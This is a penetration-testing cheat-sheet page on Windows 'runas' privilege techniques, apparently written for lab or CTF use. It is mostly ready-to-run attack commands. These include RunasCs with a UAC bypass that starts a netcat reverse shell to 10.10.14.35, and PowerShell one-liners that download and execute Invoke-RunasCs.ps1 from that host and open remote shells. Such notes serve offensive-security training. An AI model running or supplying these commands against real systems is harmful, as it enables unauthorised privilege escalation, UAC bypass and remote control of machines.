# Runas

### RunasCs

_RunasCs_ is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials.

{% code overflow="wrap" %}
```bash
# https://github.com/antonioCoco/RunasCs/

CMD> .\RunasCs.exe backup lOcjoZwqxCRpraZSmybxpdHDwtZHBIVNZoMiUMGv --bypass-uac --logon-type 8 "cmd /c C:\Temp\nc64.exe -nv 10.10.14.35 4444 -e cmd.exe"

# -l, --logon-type logon_type: logon type as NetworkCleartext (8)
# --bypass-uac: try a UAC bypass to spawn a process without token limitations (not filtered).

# https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1

$ rlwrap nc -lvnp 1337
PS> IEX (new-Object Net.WebClient).DownloadString('http://10.10.14.35/privesc/Invoke-RunasCs.ps1');Invoke-RunasCs -Username snovvcrash -Password 'Passw0rd!' -Domain megacorp.local -Command powershell.exe -Remote 10.10.14.35:1337

# -Username: 
# -Password: 
# -Domain: 
# -Command: powershell.exe 

PS> IEX (new-Object Net.WebClient).DownloadString('http://10.10.14.35/privesc/Invoke-RunasCs.ps1');Invoke-RunasCs -Username backup -Password 'tjXtAmfNIJCTTtHqoSUeRuhcUvYGWXeiXCDwDuaI' -BypassUac -LogonType 8 -Command powershell.exe -Remote 10.10.14.35:4444 

# -LogonType:8
# -BypassUac 

PS> IEX (new-Object Net.WebClient).DownloadString('http://10.10.14.35/privesc/Invoke-RunasCs.ps1');Invoke-RunasCs -Username backup -Password 'hjqNspenHcyyAwNqxfJAmFcAtiKThvpotaZpglDs' -BypassUac -LogonType 8 -Command cmd.exe -Remote 10.10.14.35:4444 

# -Command: cmd.exe 
```
{% endcode %}

### Run as with Saved Credential

```
runas /savecred /user:admin cmd.exe
```

### RDP Connection Environment

```bash
# New terminal is popped up.

CMD> runas /u:otheruser cmd.exe 
CMD> runas /u:otheruser cmd.exe 
```

### Other Runas

[https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/runas](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/runas)
